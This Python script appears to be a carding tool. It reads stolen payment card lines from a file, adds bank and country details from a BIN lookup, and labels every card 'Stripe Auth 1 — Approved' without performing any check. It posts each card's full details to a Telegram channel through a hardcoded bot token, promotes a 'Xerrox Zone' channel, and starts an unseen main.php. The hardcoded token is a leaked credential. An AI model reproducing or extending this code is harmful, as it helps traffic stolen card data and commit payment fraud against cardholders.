import requests
import json
import time
import random
import subprocess

TELEGRAM_BOT_TOKEN = "5624985423:AAHowBY32la7yMWKGedw_KeTqyYKTQSgMfc"
TELEGRAM_CHANNEL_ID = "-1001669992392"

def send_message_to_telegram_channel(message, keyboard=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHANNEL_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if keyboard:
        data["reply_markup"] = json.dumps(keyboard)
    response = requests.post(url, json=data)
    response_data = response.json()
    print(response_data)
    return response_data

def get_bin_info(card_number):
    url = f"https://lookup.binlist.net/{card_number}"
    response = requests.get(url)
    if response.status_code == 200:
        try:
            bin_info = response.json()
            return bin_info
        except json.decoder.JSONDecodeError:
            pass
    return None

def process_card(card_info):
    card_parts = card_info.split("|")
    if len(card_parts) < 4:
        return None

    card = card_parts[0]
    ccn_line = f"\n<b>Developed by ⇾ 𓆩𝗫𝗲𝗿𝗿𝗼𝘅𓆪「Zone ↯」 </b>\n "
    message = f"\n<b>⏤͟͞ 𒁍𝐆[̲̅𝐎̲̅𝐃 🔥𝐅𝐀𝐓𝐇𝐄𝐑 ـﮩﮩ٨ـ𓆩 🇧🇩 𓆪.」</b> \n<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆</b> ⚡️ Stripe Auth 1\n<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲</b> ✅ Approved\n"

    bin_info = get_bin_info(card[:8])
    if bin_info:
        bank_info = bin_info.get("bank")
        bank_name = bank_info.get("name") if bank_info else ""
        country_info = bin_info.get("country")
        country_name = country_info.get("name") if country_info else ""
        country_emoji = country_info.get("emoji") if country_info else ""
        bin_info_line = f"<b>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼</b>: {bank_name}\n<b>𝗕𝗮𝗻𝗸</b>: Traditional\n<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆</b>: {country_name} {country_emoji}\n"
        message += f"{bin_info_line}\n"

    time_line = f"<b>Time</b>: {time.strftime('%H:%M:%S')} ⌚️"
    full_message = f"<pre>{ccn_line}</pre>\n\n{message}\n<pre><b>𝗖𝗖 ⇾</b>{card_info}</pre>\n{time_line}\n"
    full_message = f"<pre>{ccn_line}</pre>\n\n{message}\n<pre><b>𝗖𝗖 ⇾</b>{card_info}</pre>\n{time_line}\n"

    return full_message


def main():
    with open("489504.txt", "r") as file:
        cards = file.readlines()
        messages = []
        for card_info in cards:
            message = process_card(card_info.strip())
            if message:
                messages.append(message)

        keyboard = {
            "inline_keyboard": [[{"text": "𓆩𝗫𝗲𝗿𝗿𝗼𝘅𓆪「Zone ↯」", "url": "https://t.me/xerrox_auth"}]]
        }

        for message in messages:
            send_message_to_telegram_channel(message, keyboard)
            time.sleep(15)

if __name__ == "__main__":
    subprocess.Popen(["php", "main.php"])
    time.sleep(2)
    main()
